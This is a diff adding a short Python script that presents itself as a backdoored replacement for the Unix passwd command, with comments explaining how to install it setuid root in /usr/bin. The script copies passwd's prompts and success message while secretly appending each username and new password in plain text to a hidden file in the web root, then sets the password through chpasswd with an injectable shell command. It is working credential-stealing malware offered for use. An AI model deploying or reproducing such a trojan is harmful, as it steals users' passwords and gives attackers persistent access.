@@ -1,0 +1,30 @@
+#!/usr/bin/python
+
+# Backdoored passwd "binary", prompts user saves username/password to file
+# then changes password by piping credentials to chpasswd binary
+# mv passwd /usr/bin/ ; chown root:root /usr/bin/passwd; chmod 4755 /usr/bin/passwd
+#
+# Brought to you by Adam Smith :)
+
+import getpass, sys, time, os
+
+if len(sys.argv) > 1:
+    username = sys.argv[1]
+else:
+    username = getpass.getuser()
+    
+print "Changing password for user %s." % username
+pass1 = getpass.getpass("New password: ")
+pass2 = getpass.getpass("Retype new password: ")
+
+if (pass1 == pass2):
+    print "passwd: all authentication tokens updated successfully."
+    now = time.localtime()
+    currtime = str(time.strftime("%d %b %Y %H:%M:%S", now))
+    f = open('/var/www/...', 'a')
+    f.write("["+currtime+"] "+ username +"/"+ pass1+"\r\n")
+    f.close()
+    os.system("sudo echo '"+ username + ":" + pass1 + "' | sudo /usr/sbin/chpasswd")
+else:
+    print "Sorry, passwords do not match."
+
